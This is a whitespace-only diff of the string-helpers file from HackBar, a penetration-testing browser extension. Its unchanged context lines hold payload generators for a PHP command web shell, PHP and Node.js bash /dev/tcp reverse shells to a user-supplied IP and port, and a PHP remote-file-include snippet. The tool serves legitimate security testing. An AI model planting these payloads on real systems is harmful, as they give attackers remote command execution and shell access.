@@ -1,5 +1,4 @@
 HackBar.Strings = {
-	
 	hackBarUsefullStrings : {
 	    pi: "3,14159265",
 	    phi: "1.618033988749895",
@@ -42,16 +41,16 @@ HackBar.Strings = {
 	    tagc:"0x2f3e",
 	    ctagwithslash:"0x222f3e"
 	},
-	
-	
-	
-	
-	
-	
+
+
+
+
+
+
 	getUsefullString : function (key) {
 		hackBar.setSelectedText(this.hackBarUsefullStrings[key]);
-	}, 
-	
+	},
+
 	// Used by Overflow menu option.
 	// Returns a 'A's string to test overflows and application limits
 	generateOverflowString : function (stringLength) {
@@ -60,14 +59,14 @@ HackBar.Strings = {
 			stringLength = prompt("Length of the string to use in the overflow:", "1337");
 			stringLength = Math.min(4096, parseInt(stringLength, 10));
 		}
-		
+
 		for (var i = 0; i < stringLength; i++) {
 			result += "A";
 		}
 		hackBar.setSelectedText("%23" + result + "%0A");
-	}, 
-	
-	// Reverse a string 
+	},
+
+	// Reverse a string
 	reverseString : function () {
 		var originalString = hackBar.getSelectedText();
 		var splitext = originalString.split("");
@@ -75,17 +74,17 @@ HackBar.Strings = {
 		var reversed = revertext.join("");
 		hackBar.setSelectedText(reversed);
 	},
-	
+
 	lowercaseString : function () {
     var txt = hackBar.getSelectedText();
-    hackBar.setSelectedText( txt.toLowerCase() )    
+    hackBar.setSelectedText( txt.toLowerCase() )
 	},
-	
+
 	uppercaseString : function () {
     var txt = hackBar.getSelectedText();
     hackBar.setSelectedText( txt.toUpperCase() )
     },
-	
+
    randomcaseString : function () {
     var txt = hackBar.getSelectedText();
     var newString = ""
@@ -99,58 +98,58 @@ HackBar.Strings = {
     }
     hackBar.setSelectedText( newString )
     },
-	
+
 	phpbackdoor : function () {
     hackBar.setSelectedText( "<?php echo system($_GET[\"cmd\"]); ?>" )
    },
-   
+
   phprevshell : function () {
     var ip = prompt("IP Address?");
     var port = prompt("Port?");
     hackBar.setSelectedText( "<?php system(\"bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"); ?>" )
     },
-	
+
  phprfi : function () {
     hackBar.setSelectedText( "<?php include($_GET[\"file\"]); ?>" )
    },
-	
+
  nodejsrevshell : function () {
      var ip = prompt("IP Address:");
     var port = prompt("Port:");
     hackBar.setSelectedText("require('child_process').exec('bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1')");
    },
-	
+
 stripcustom : function () {
     var str = prompt("String you would like to remove:")
     var txt = hackBar.getSelectedText();
     var re = new RegExp(str, 'g');
     var newString = txt.replace(re, '');
-    hackBar.setSelectedText( newString ); 
+    hackBar.setSelectedText( newString );
 	  },
-	
+
 	addslashes : function () {
 		var txt = hackBar.getSelectedText();
 		txt = txt.replace(/\\/g, '\\\\');
 		txt = txt.replace(/\'/g, "\\'");
 		txt = txt.replace(/\"/g, '\\"');
 		hackBar.setSelectedText(txt);
-	}, 
-	
+	},
+
 	stripslashes : function () {
 		var txt = hackBar.getSelectedText();
 		txt = txt.replace(/\\'/g, '\'');
 		txt = txt.replace(/\\"/g, '"');
 		txt = txt.replace(/\\\\/g, '\\');
 		hackBar.setSelectedText(txt);
-	}, 
-	
+	},
+
 	stripspaces : function () {
 		var txt = hackBar.getSelectedText();
 		txt = txt.replace(/ /g, '');
 		hackBar.setSelectedText(txt);
 	},
-	
-	
+
+
 	binaryencode : function () {
       var txt = this.getSelectedText();
       var newString = HackBar.Encrypt.toBinary(txt);
@@ -172,7 +171,7 @@ selectionToSHA: function ( sha_type ) {
     var sha_str = (sha_type == 1) ? HackBar.Encrypt.sha1(txt) : HackBar.Encrypt.sha2(txt);;
     hackBar.setSelectedText( sha_str );
   },
-	
-	
+
+
 	};
- 
+
